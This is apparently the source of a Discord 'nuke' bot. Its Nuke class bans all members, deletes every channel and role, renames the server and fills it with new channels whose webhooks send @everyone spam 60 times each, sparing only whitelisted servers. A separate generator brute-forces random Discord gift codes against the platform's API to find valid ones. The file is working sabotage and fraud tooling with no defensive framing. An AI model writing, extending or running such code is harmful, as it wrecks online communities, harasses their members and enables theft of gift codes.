import discord
import string
import random
import requests
from discord.ext import commands
from asyncio import create_task
from cfg import bot_data
from logs import Logging, write_log

session = requests.Session()
intents = discord.Intents.all()
intents.message_content = True
client = commands.Bot(command_prefix=f"{bot_data['prefix']}", help_command=None, intents=intents, reconnect=False)
log = Logging()


async def occurred_error(error_name: str) -> None:
    await write_log(f"An error {error_name} occurred.")


def generate(codes: int):
    for _ in range(codes):
        code = "discord.gift/" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        req = session.get(
            f"https://discordapp.com/api/entitlements/gift-codes/{code}",
            timeout=10,
        ).status_code

        if req == 200:
            code = f"[VALID] [{code}](https://{code})"
        elif req == 404:
            code = f"[INVALID] [{code}](https://{code})"
        elif req == 429:
            code = f"[CAN'T CHECK] [{code}](https://{code})"

        yield code


async def spam_channels(webhook, amount: int) -> None:
    for _ in range(amount):
        await webhook.send("@everyone @here " + bot_data['message'], username=bot_data['message'],
                           avatar_url=bot_data['avatar_url'])


class Nuke:
    def __init__(self, guild):
        self.guild = guild

    async def delete_all_channels(self) -> None:
        for channel in self.guild.channels:
            try:
                await channel.delete()
            except Exception as error_name:
                await occurred_error(str(error_name))

    async def delete_all_roles(self) -> None:
        for role in self.guild.roles:
            try:
                await role.delete()
            except Exception as error_name:
                await occurred_error(str(error_name))

    async def ban_all_members(self) -> None:
        for member in self.guild.members:
            try:
                await member.ban(delete_message_days=7)
            except Exception as error_name:
                await occurred_error(str(error_name))

    async def create_roles(self, name: str) -> None:
        for _ in range(40 - len(self.guild.roles)):
            try:
                await self.guild.create_role(name=name)
            except Exception as error_name:
                await occurred_error(str(error_name))

    async def create_text_channels(self, name: str) -> None:
        for _ in range(40 - len(self.guild.channels)):
            try:
                channel = await self.guild.create_text_channel(name=name)
                webhook = await channel.create_webhook(name=name)
                create_task(spam_channels(webhook, 60))
            except Exception as error_name:
                await occurred_error(str(error_name))


async def nuke_guild(guild):
    if guild.id in bot_data['white_list_guilds']:
        pass
    else:
        nuked = Nuke(guild)

        with open('icon.png', 'rb') as file:
            icon = file.read()
        await guild.edit(name=bot_data['message'], icon=icon)

        create_task(nuked.ban_all_members())

        create_task(nuked.delete_all_channels())

        create_task(nuked.delete_all_roles())

        create_task(nuked.create_roles(bot_data['message']))

        create_task(nuked.create_text_channels(bot_data['message']))
